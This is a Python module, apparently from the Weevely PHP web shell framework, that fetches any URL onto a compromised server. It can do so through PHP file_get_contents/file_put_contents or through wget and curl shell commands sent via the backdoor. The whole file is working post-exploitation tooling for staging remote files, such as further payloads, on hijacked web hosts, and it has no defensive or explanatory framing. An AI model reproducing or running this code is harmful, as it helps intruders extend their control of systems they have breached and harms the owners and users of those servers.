from weevely.core.module import Module
from weevely.core.vectors import PhpCode
from weevely.core.vectors import ShellCmd


class Webdownload(Module):
    """Download an URL."""

    aliases = ["wget"]

    def init(self):
        self.register_info({"author": ["Emilio Pinna"], "license": "GPLv3"})

        self.register_vectors(
            [
                PhpCode("""@file_put_contents("${rpath}",file_get_contents("${url}"));""", name="file_put_contents"),
                ShellCmd("""wget ${url} -O ${rpath}""", name="wget"),
                ShellCmd("""curl -o ${rpath} ${url}""", name="curl"),
            ]
        )

        self.register_arguments(
            [
                {"name": "url", "help": "URL to download remotely"},
                {"name": "rpath", "help": "Remote file path"},
                {"name": "-vector", "choices": self.vectors.get_names(), "default": "file_put_contents"},
            ]
        )

    def run(self, **kwargs):
        return self.vectors.get_result(name=self.args["vector"], format_args=self.args)
